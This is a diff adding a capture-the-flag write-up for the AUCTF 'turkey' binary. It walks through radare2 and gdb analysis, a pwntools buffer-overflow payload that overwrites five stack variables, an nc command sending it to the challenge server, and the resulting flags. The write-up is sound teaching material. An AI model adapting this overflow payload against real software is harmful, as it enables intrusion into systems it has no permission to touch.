@@ -637,5 +637,77 @@ Flag: `auctf{static_or_dyn@mIc?_12923}`
 > [turkey](thanksgiving%20dinner/turkey)**
 
 ### Solution:
+Nice! by doing `file` command we know it's 32-bit ELF file, dynamically linked and not stripped
+and with `strings` command nothing really interesting
+
+And with radare2:
+```
+$ r2 -AA turkey
+[0x000010c0]> afl
+..
+0x000011f9    1 87           main
+0x00001250    7 198          sym.vulnerable
+..
+```
+
+Those are interesting functions .. the main only puts a text and then calls vulnerable() function which makes 5 checks if they're all true it prints out the flag!:
+
+<div align="center"><img src="assests/thanksgiving1.png" alt="r2 screenshot"></div>
+
+We go to gdb-peda for a better memory examine and debugging:
+
+```
+gdb-peda$ set disassembly-flavor intel
+gdb-peda$ disass vulnerable
+```
+
+<div align="center"><img src="assests/thanksgiving2.png" alt="gdb-peda screenshot"></div>
+
+We see fgets length is 0x24 which is 36, so we put a breakpoint after fgets that will allow us to examine the memory right after we enter the input.
 
 
+And by running the file and enters `AAAA` as input:
+
+<div align="center"><img src="assests/thanksgiving3.png" alt="gdb-peda screenshot"></div>
+
+
+We can see that eax register is pointing to 0xbffff14c address and by examining the memory at this location and all the addresses in the comparisons:
+
+<div align="center"><img src="assests/thanksgiving4.png" alt="gdb-peda screenshot"></div>
+
+GREAT! Now we can overwrite those values to pass the checks .. and these are the 5 checks:
+
+<div align="center"><img src="assests/thanksgiving5.png" alt="gdb-peda screenshot"></div>
+
+
+- ![Red](https://placehold.it/15/ff0000/000000?text=+)    0xbffff16c  MUST EQUAL 0x1337
+- ![Green](https://placehold.it/15/00ff00/000000?text=+)  0xbffff168  MUST BE LESS THAN 0xffffffec (= -20)
+- ![Yellow](https://placehold.it/15/ffff00/000000?text=+) 0xbffff160  MUST NOT EQUAL 0x14
+- ![Pink](https://placehold.it/15/ff00ff/000000?text=+)   0xbffff164  MUST EQUAL 0x667463
+- ![Orange](https://placehold.it/15/ff6600/000000?text=+) 0xbffff15c  MUST EQUAL 0x2a
+
+Now our payload is:
+
+```python
+>>> from pwn import p32
+>>> 'A'*16 + p32(0x2a) + p32(0x20) + p32(0x667463) + p32(0xffffffec - 10) + p32(0x1337)
+'AAAAAAAAAAAAAAAA*\x00\x00\x00 \x00\x00\x00ctf\x00\xe2\xff\xff\xff7\x13\x00\x00'
+```
+
+Now we can pipe it to the server:
+
+```
+$ python -c "print 'AAAAAAAAAAAAAAAA*\x00\x00\x00 \x00\x00\x00ctf\x00\xe2\xff\xff\xff7\x13\x00\x00'" | nc challenges.auctf.com 30011
+Hi!
+Welcome to my program... it's a little buggy...
+Hey I heard you are searching for flags! Well I've got one. :)
+Here you can have part of it!
+auctf{
+
+Sorry that's all I got!
+
+Wait... you aren't supposed to be here!!
+auctf{I_s@id_1_w@s_fu11!}
+```
+
+Flag: `auctf{I_s@id_1_w@s_fu11!}`
